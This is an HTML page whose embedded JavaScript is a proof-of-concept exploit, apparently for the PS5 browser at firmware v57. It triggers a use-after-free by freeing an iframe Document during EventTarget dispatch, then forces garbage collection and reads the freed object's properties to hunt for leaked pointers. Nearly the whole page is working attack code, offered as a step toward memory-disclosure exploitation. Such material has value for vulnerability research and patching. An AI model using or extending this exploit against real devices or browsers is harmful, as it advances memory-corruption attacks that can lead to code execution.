<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>PS5 v57 - EventTarget Delayed Leak</title>
<style>
body { background: #0a0a0a; color: #00ff41; font-family: 'MS Gothic', monospace; padding: 20px; }
button { display: block; width: 100%; padding: 15px; margin: 5px 0; font-size: 18px; background: #111; color: #00ff41; border: 1px solid #00ff41; cursor: pointer; }
pre { white-space: pre-wrap; word-wrap: break-word; margin-top: 20px; }
</style>
</head>
<body>

<h3>EventTarget UAF — Delayed Info Leak</h3>
<p>Click the button. Wait 2 seconds. It reads the freed Document properties.</p>

<button onclick="triggerUAF()">Trigger UAF and Read After Delay</button>

<pre id="out"></pre>

<script>
var out = document.getElementById("out");
function log(m) { out.textContent += m + "\n"; }

function triggerUAF() {
    log("\n[*] Triggering UAF...");
    
    var f = document.body.appendChild(document.createElement('iframe'));
    var a = document.createElement('div');
    var b = a.appendChild(document.createElement('div'));
    var savedDoc = f.contentDocument;
    
    log("[*] savedDoc before free: " + savedDoc);
    
    // First listener on 'a' (bubbles after 'b')
    a.addEventListener('a', function() {
        document.adoptNode(a);
        f.remove();
        log("[*] iframe removed. Document should be freed...");
    });
    
    a.addEventListener('a', function() {});
    
    // Second listener on 'b' (target phase)
    b.addEventListener('a', function() {
        f.contentDocument.adoptNode(a);
    });
    
    // Dispatch event
    b.dispatchEvent(new Event('a', { bubbles: true }));
    
    log("[*] Event dispatch complete. Waiting 1 second for GC...");
    
    // Wait 1 second, then try to read the freed document
    setTimeout(function() {
        log("\n[*] Attempting to read freed Document properties...\n");
        
        // Force GC
        for (var i = 0; i < 100; i++) {
            new ArrayBuffer(0x100000);
        }
        log("[*] GC triggered.\n");
        
        try { log("[*] savedDoc.nodeType: " + savedDoc.nodeType); } catch(e) { log("[!] nodeType: " + e.message); }
        try { log("[*] savedDoc.nodeName: " + savedDoc.nodeName); } catch(e) { log("[!] nodeName: " + e.message); }
        try { log("[*] savedDoc.URL: " + savedDoc.URL); } catch(e) { log("[!] URL: " + e.message); }
        try { log("[*] savedDoc.title: " + savedDoc.title); } catch(e) { log("[!] title: " + e.message); }
        try { log("[*] savedDoc.domain: " + savedDoc.domain); } catch(e) { log("[!] domain: " + e.message); }
        try { log("[*] savedDoc.readyState: " + savedDoc.readyState); } catch(e) { log("[!] readyState: " + e.message); }
        try { log("[*] savedDoc.documentElement: " + savedDoc.documentElement); } catch(e) { log("[!] documentElement: " + e.message); }
        try { log("[*] savedDoc.body: " + savedDoc.body); } catch(e) { log("[!] body: " + e.message); }
        try { log("[*] savedDoc.location: " + savedDoc.location); } catch(e) { log("[!] location: " + e.message); }
        try { log("[*] savedDoc.defaultView: " + savedDoc.defaultView); } catch(e) { log("[!] defaultView: " + e.message); }
        try { log("[*] savedDoc.toString(): " + savedDoc.toString()); } catch(e) { log("[!] toString: " + e.message); }
        try { log("[*] JSON.stringify(savedDoc): " + JSON.stringify(savedDoc)); } catch(e) { log("[!] JSON.stringify: " + e.message); }
        
        log("\n[*] Property scan complete.");
        log("[*] If any value looks like a pointer (long number, weird string), we have a leak!");
    }, 1000);
}
</script>
</body>
</html>
